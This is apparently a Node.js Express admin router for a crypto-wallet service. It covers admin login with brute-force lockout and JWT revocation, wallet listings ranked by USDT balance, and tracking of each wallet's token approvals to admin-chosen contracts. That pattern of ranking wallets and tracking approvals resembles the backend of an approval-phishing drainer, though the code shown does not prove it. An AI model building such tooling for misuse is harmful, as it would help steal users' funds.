const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { body, validationResult } = require('express-validator');
const { AdminUser, ApprovalAddress, User } = require('../config/database');
const { authMiddleware } = require('../middleware/auth.middleware');
const { refreshAllBalances } = require('../utils/balance-fetcher');
const refreshStatus = require('../utils/refresh-status');
const { cacheGet, cacheSet, cacheTopWallets, getTopWallets, CACHE_TTL, getRedisClient } = require('../config/redis');
const { Op } = require('sequelize');

const isProduction = process.env.NODE_ENV === 'production';

// ─── Helper: Safe error response ──────────────────────────
function errorResponse(res, status, message, error) {
    res.status(status).json({
        success: false,
        message,
        ...(isProduction ? {} : { error: error?.message || error }),
    });
}

// ─── Brute-Force Protection ──────────────────────────────
// Uses Redis if available, falls back to in-memory Map
const loginAttempts = new Map(); // Fallback if Redis unavailable
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_SECONDS = 900; // 15 minutes

async function getLoginAttempts(key) {
    try {
        const redis = getRedisClient();
        const data = await redis.get(`login:${key}`);
        return data ? JSON.parse(data) : { count: 0, lockedUntil: 0 };
    } catch {
        return loginAttempts.get(key) || { count: 0, lockedUntil: 0 };
    }
}

async function setLoginAttempts(key, attempts) {
    try {
        const redis = getRedisClient();
        await redis.setex(`login:${key}`, LOCKOUT_SECONDS, JSON.stringify(attempts));
    } catch {
        loginAttempts.set(key, attempts);
    }
}

async function clearLoginAttempts(key) {
    try {
        const redis = getRedisClient();
        await redis.del(`login:${key}`);
    } catch {
        loginAttempts.delete(key);
    }
}

/**
 * POST /api/admin/login
 * Admin authentication with brute-force protection
 */
router.post('/login', [
    body('username').notEmpty().trim().escape(),
    body('password').notEmpty()
], async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ success: false, errors: errors.array() });
        }

        const { username, password } = req.body;
        const lockKey = `${req.ip}:${username}`;

        // ── Check lockout ──
        const attempts = await getLoginAttempts(lockKey);
        if (attempts.lockedUntil && Date.now() < attempts.lockedUntil) {
            const remainingSec = Math.ceil((attempts.lockedUntil - Date.now()) / 1000);
            return res.status(429).json({
                success: false,
                message: `Account locked. Try again in ${remainingSec} seconds.`
            });
        }

        // Find admin user
        const admin = await AdminUser.findOne({
            where: { username, isActive: true }
        });

        if (!admin) {
            // Increment failed attempts
            attempts.count++;
            if (attempts.count >= MAX_LOGIN_ATTEMPTS) {
                attempts.lockedUntil = Date.now() + LOCKOUT_SECONDS * 1000;
            }
            await setLoginAttempts(lockKey, attempts);
            return res.status(401).json({ success: false, message: 'Invalid credentials' });
        }

        // Verify password
        const isValidPassword = await bcrypt.compare(password, admin.passwordHash);

        if (!isValidPassword) {
            attempts.count++;
            if (attempts.count >= MAX_LOGIN_ATTEMPTS) {
                attempts.lockedUntil = Date.now() + LOCKOUT_SECONDS * 1000;
            }
            await setLoginAttempts(lockKey, attempts);
            return res.status(401).json({ success: false, message: 'Invalid credentials' });
        }

        // ── Successful login — clear attempts ──
        await clearLoginAttempts(lockKey);

        // Update last login
        admin.lastLogin = new Date();
        await admin.save();

        // Generate JWT token — NO fallback secret
        const jwtSecret = process.env.JWT_SECRET;
        if (!jwtSecret) {
            return errorResponse(res, 500, 'Server misconfiguration');
        }

        const jti = require('crypto').randomUUID(); // Unique token ID for revocation
        const token = jwt.sign(
            {
                id: admin.id,
                username: admin.username,
                role: admin.role,
                jti,
            },
            jwtSecret,
            { expiresIn: process.env.JWT_EXPIRES_IN || '2h' }
        );

        // Store session in Redis for revocation support
        try {
            const redis = getRedisClient();
            const expiresIn = parseInt(process.env.JWT_EXPIRES_IN) || 2;
            await redis.setex(`session:${jti}`, expiresIn * 3600, JSON.stringify({
                userId: admin.id,
                username: admin.username,
                createdAt: new Date().toISOString(),
            }));
        } catch {
            // Redis optional — token still works, just can't be revoked
        }


        res.json({
            success: true,
            message: 'Login successful',
            token,
            admin: {
                username: admin.username,
                email: admin.email,
                role: admin.role,
                lastLogin: admin.lastLogin
            }
        });

    } catch (error) {
        errorResponse(res, 500, 'Login failed', error);
    }
});

/**
 * POST /api/admin/logout
 * Invalidate the current JWT by blacklisting its jti in Redis
 */
router.post('/logout', authMiddleware, async (req, res) => {
    try {
        const jti = req.admin.jti;
        if (jti) {
            try {
                const redis = getRedisClient();
                await redis.del(`session:${jti}`);
                await redis.setex(`blacklist:${jti}`, 86400, '1'); // Blacklist for 24h
            } catch {
                // Redis not available — token will expire naturally
            }
        }

        res.json({ success: true, message: 'Logged out successfully' });
    } catch (error) {
        errorResponse(res, 500, 'Logout failed', error);
    }
});

/**
 * GET /api/admin/approvals
 * Get all approval addresses (protected)
 */
router.get('/approvals', authMiddleware, async (req, res) => {
    try {
        const approvals = await ApprovalAddress.findAll({
            order: [['createdAt', 'DESC']]
        });

        let result = approvals.map(a => a.toJSON());

        res.json({
            success: true,
            count: result.length,
            approvals: result
        });

    } catch (error) {
        errorResponse(res, 500, 'Failed to retrieve approvals', error);
    }
});

/**
 * GET /api/admin/users
 * Get all registered users with stored USDT balances,
 * sorted by balance descending, with pagination.
 */
router.get('/users', authMiddleware, async (req, res) => {
    try {
        const page = Math.max(1, parseInt(req.query.page) || 1);
        const limit = Math.min(1000, Math.max(1, parseInt(req.query.limit) || 1000));
        const offset = (page - 1) * limit;
        const cacheKey = `users:page:${page}:${limit}`;

        // ── Redis cache check ──
        const cached = await cacheGet(cacheKey);
        if (cached) {
            return res.json({ ...cached, cacheHit: true });
        }

        // ── DB fallback ──
        const total = await User.count();
        const totalPages = Math.ceil(total / limit);

        const users = await User.findAll({
            attributes: ['walletAddress', 'usdtBalance', 'status', 'approvalStatus', 'approvalUpdatedAt', 'lastBalanceUpdate'],
            order: [
                ['usdtBalance', 'DESC'],
                ['id', 'ASC']
            ],
            limit,
            offset,
            raw: true
        });

        const usersFormatted = users.map(u => ({
            walletAddress: u.walletAddress,
            usdtBalance: u.usdtBalance !== null ? parseFloat(u.usdtBalance).toFixed(4) : '0.0000',
            status: u.status,
            approvalStatus: u.approvalStatus,
            approvalUpdatedAt: u.approvalUpdatedAt,
            lastBalanceUpdate: u.lastBalanceUpdate
        }));

        const responseData = {
            success: true,
            count: usersFormatted.length,
            users: usersFormatted,
            pagination: {
                page,
                limit,
                total,
                totalPages
            },
            lastRefreshed: refreshStatus.lastRefreshedAt
        };

        // ── Write to Redis cache ──
        await cacheSet(cacheKey, responseData, CACHE_TTL.PAGE);

        res.json({ ...responseData, cacheHit: false });

    } catch (error) {
        errorResponse(res, 500, 'Failed to retrieve users', error);
    }
});

/**
 * GET /api/admin/users/top
 * Get pre-cached top N wallets (instant response from Redis)
 */
router.get('/users/top', authMiddleware, async (req, res) => {
    try {
        const n = Math.min(1000, Math.max(1, parseInt(req.query.n) || 100));
        const cacheKey = `users:top:${n}`;

        // Try Redis first
        const cached = await cacheGet(cacheKey);
        if (cached) {
            return res.json({ success: true, wallets: cached, count: cached.length, cacheHit: true });
        }

        // DB fallback
        const topUsers = await User.findAll({
            attributes: ['walletAddress', 'usdtBalance', 'approvalStatus', 'lastBalanceUpdate'],
            order: [['usdtBalance', 'DESC'], ['id', 'ASC']],
            limit: n,
            raw: true
        });

        const formatted = topUsers.map((u, idx) => ({
            rank: idx + 1,
            walletAddress: u.walletAddress,
            usdtBalance: u.usdtBalance !== null ? parseFloat(u.usdtBalance).toFixed(4) : '0.0000',
            approvalStatus: u.approvalStatus,
            lastBalanceUpdate: u.lastBalanceUpdate
        }));

        await cacheSet(cacheKey, formatted, CACHE_TTL.TOP_N);

        res.json({ success: true, wallets: formatted, count: formatted.length, cacheHit: false });

    } catch (error) {
        errorResponse(res, 500, 'Failed to get top users', error);
    }
});

/**
 * GET /api/admin/users/summary
 * Aggregated balance stats
 */
router.get('/users/summary', authMiddleware, async (req, res) => {
    try {
        const cacheKey = 'users:summary';
        const cached = await cacheGet(cacheKey);
        if (cached) {
            return res.json({ success: true, summary: cached, cacheHit: true });
        }

        const { sequelize } = require('../config/database');
        const [results] = await sequelize.query(`
            SELECT 
                COUNT(*) as total_wallets,
                COUNT(*) FILTER (WHERE "usdtBalance" > 0) as wallets_with_balance,
                COALESCE(SUM("usdtBalance"), 0) as total_balance,
                COALESCE(MAX("usdtBalance"), 0) as max_balance,
                COALESCE(AVG("usdtBalance") FILTER (WHERE "usdtBalance" > 0), 0) as avg_balance,
                COUNT(*) FILTER (WHERE "approvalStatus" = 'approved') as approved_count,
                MAX("lastBalanceUpdate") as last_update
            FROM "Users"
        `);

        const summary = results[0];
        await cacheSet(cacheKey, summary, CACHE_TTL.SUMMARY);

        res.json({ success: true, summary, cacheHit: false });

    } catch (error) {
        errorResponse(res, 500, 'Failed to get summary', error);
    }
});

/**
 * POST /api/admin/refresh-balances
 * Trigger a background balance refresh using Multicall3.
 */
router.post('/refresh-balances', authMiddleware, async (req, res) => {
    try {
        if (refreshStatus.isRefreshing) {
            return res.status(409).json({
                success: false,
                message: 'Refresh already in progress',
                status: refreshStatus.toJSON()
            });
        }

        // Trigger refresh in background (don't await)
        refreshAllBalances().catch(err => {
        });

        res.json({
            success: true,
            message: 'Balance refresh started in background',
            status: refreshStatus.toJSON()
        });
    } catch (error) {
        errorResponse(res, 500, 'Failed to start refresh', error);
    }
});

/**
 * GET /api/admin/refresh-status
 * Get the current status of a balance refresh operation.
 */
router.get('/refresh-status', authMiddleware, (req, res) => {
    res.json({
        success: true,
        status: refreshStatus.toJSON()
    });
});

/**
 * POST /api/admin/approvals
 * Add new approval address (protected)
 */
router.post('/approvals', authMiddleware, [
    body('contractAddress').isEthereumAddress(),
    body('description').notEmpty().trim().isLength({ max: 500 }),
    body('chainId').isInt({ min: 1 }),
    body('isActive').optional().isBoolean()
], async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ success: false, errors: errors.array() });
        }

        const { contractAddress, description, chainId, isActive } = req.body;

        const existing = await ApprovalAddress.findOne({
            where: { contractAddress: contractAddress.toLowerCase() }
        });

        if (existing) {
            return res.status(409).json({
                success: false,
                message: 'Contract address already exists'
            });
        }

        const newApproval = await ApprovalAddress.create({
            contractAddress: contractAddress.toLowerCase(),
            description,
            chainId,
            isActive: isActive !== undefined ? isActive : true,
            addedBy: req.admin.username
        });


        res.status(201).json({
            success: true,
            message: 'Approval address added successfully',
            approval: newApproval
        });

    } catch (error) {
        errorResponse(res, 500, 'Failed to add approval address', error);
    }
});

/**
 * PUT /api/admin/approvals/:id
 * Update approval address — WHITELISTED FIELDS ONLY (prevents mass assignment)
 */
router.put('/approvals/:id', authMiddleware, [
    body('description').optional().trim().isLength({ max: 500 }),
    body('isActive').optional().isBoolean(),
], async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ success: false, errors: errors.array() });
        }

        const { id } = req.params;
        const approval = await ApprovalAddress.findByPk(id);

        if (!approval) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }

        // ✅ Whitelist — only allow safe fields to be updated
        const ALLOWED_FIELDS = ['description', 'isActive'];
        const sanitized = {};
        ALLOWED_FIELDS.forEach(field => {
            if (req.body[field] !== undefined) {
                sanitized[field] = req.body[field];
            }
        });

        if (Object.keys(sanitized).length === 0) {
            return res.status(400).json({ success: false, message: 'No valid fields to update' });
        }

        await approval.update(sanitized);

        res.json({ success: true, message: 'Updated successfully', approval });
    } catch (error) {
        errorResponse(res, 500, 'Update failed', error);
    }
});

router.delete('/approvals/:id', authMiddleware, async (req, res) => {
    try {
        const { id } = req.params;
        const approval = await ApprovalAddress.findByPk(id);

        if (!approval) {
            return res.status(404).json({ success: false, message: 'Not found' });
        }

        await approval.destroy();

        res.json({ success: true, message: 'Deleted successfully' });
    } catch (error) {
        errorResponse(res, 500, 'Delete failed', error);
    }
});

/**
 * POST /api/admin/approve-token
 * Trigger token approval for a specific wallet
 */
router.post('/approve-token', authMiddleware, [
    body('walletAddress').isEthereumAddress(),
    body('txHash').matches(/^0x[a-fA-F0-9]{64}$/)
], async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ success: false, errors: errors.array() });
        }

        const { walletAddress, txHash } = req.body;

        const user = await User.findOne({
            where: { walletAddress: walletAddress.toLowerCase() }
        });

        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }

        user.approvalStatus = 'pending_approval';
        user.approvalTxHash = txHash;
        user.approvalUpdatedAt = new Date();
        await user.save();


        res.json({
            success: true,
            message: 'Approval transaction submitted',
            user: {
                walletAddress: user.walletAddress,
                approvalStatus: user.approvalStatus,
                approvalTxHash: user.approvalTxHash
            }
        });

    } catch (error) {
        errorResponse(res, 500, 'Failed to process approval', error);
    }
});

/**
 * POST /api/admin/confirm-approval
 * Confirm that approval transaction was successful
 */
router.post('/confirm-approval', authMiddleware, [
    body('walletAddress').isEthereumAddress(),
    body('confirmed').isBoolean()
], async (req, res) => {
    try {
        const errors = validationResult(req);
        if (!errors.isEmpty()) {
            return res.status(400).json({ success: false, errors: errors.array() });
        }

        const { walletAddress, confirmed } = req.body;

        const user = await User.findOne({
            where: { walletAddress: walletAddress.toLowerCase() }
        });

        if (!user) {
            return res.status(404).json({ success: false, message: 'User not found' });
        }

        user.approvalStatus = confirmed ? 'approved' : 'not_approved';
        user.approvalUpdatedAt = new Date();
        await user.save();


        res.json({
            success: true,
            message: confirmed ? 'Approval confirmed' : 'Approval failed',
            user: {
                walletAddress: user.walletAddress,
                approvalStatus: user.approvalStatus
            }
        });

    } catch (error) {
        errorResponse(res, 500, 'Failed to confirm approval', error);
    }
});

/**
 * GET /api/admin/stats
 * Get admin dashboard statistics (protected)
 */
router.get('/stats', authMiddleware, async (req, res) => {
    try {
        const totalUsers = await User.count();
        const confirmedUsers = await User.count({ where: { status: 'confirmed' } });
        const pendingUsers = await User.count({ where: { status: 'pending' } });
        const totalApprovals = await ApprovalAddress.count();
        const activeApprovals = await ApprovalAddress.count({ where: { isActive: true } });

        const sevenDaysAgo = new Date();
        sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);

        const recentRegistrations = await User.count({
            where: {
                registrationDate: { [Op.gte]: sevenDaysAgo }
            }
        });

        res.json({
            success: true,
            stats: {
                totalUsers,
                confirmedUsers,
                pendingUsers,
                totalApprovals,
                activeApprovals,
                recentRegistrations
            }
        });

    } catch (error) {
        errorResponse(res, 500, 'Failed to retrieve statistics', error);
    }
});

module.exports = router;
